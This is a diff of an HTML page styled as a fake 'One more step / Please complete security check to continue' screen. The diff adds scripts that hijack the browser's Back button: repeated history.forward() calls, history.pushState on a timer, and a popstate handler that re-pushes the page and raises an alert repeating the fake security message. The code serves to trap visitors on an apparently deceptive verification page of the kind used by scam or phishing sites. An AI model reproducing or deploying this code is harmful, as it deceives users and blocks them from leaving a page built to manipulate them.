@@ -5,19 +5,20 @@
 <meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
 <head>
 <title>One more step</title>
-<SCRIPT type="text/javascript">
-    window.history.forward();
-    function noBack() { window.history.forward(); }
-</SCRIPT>
+
+<script type = "text/javascript" >
+    function preventBack(){ window.history.forward(); }
+    setTimeout("preventBack()", 0);
+    window.onunload=function(){ void (0) };
+</script>
+<script type='text/javascript'> setTimeout(function back() { history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); alert('One more step | Please complete security check to continue !'); }); }, 500) </script>
 
 <style>
 html, body { font-family: Arial, Helvetica, sans-serif!important; -webkit-text-size-adjust: 100%; }
 </style>
+
 </head>
-<body  onload="noBack();" onpageshow="if (event.persisted) noBack();" onunload="void (0)" >
-
-<script type='text/javascript'> history.pushState(null, null, document.URL); window.addEventListener('popstate', function () { history.pushState(null, null, document.URL); alert('One more step | Please complete security check to continue !'); }); </script>
-
+<body>
 <h1 style="font-size: 40px; width: 90%; margin-left: auto; margin-right: auto; margin-top: 30px!important; margin-bottom: 25px!important; text-align: center; letter-spacing: 1px;"><span style="font-weight: bold;">One more step</span></h1><h2 style="text-align: center; width: auto; margin-left: auto; margin-right: auto; margin-bottom: 75px!important; font-size: 25px; letter-spacing: 1px;"><span style="font-weight: normal;">Please complete security check to continue</span></h2>
 <div class="cc">
 <div class="box-main">
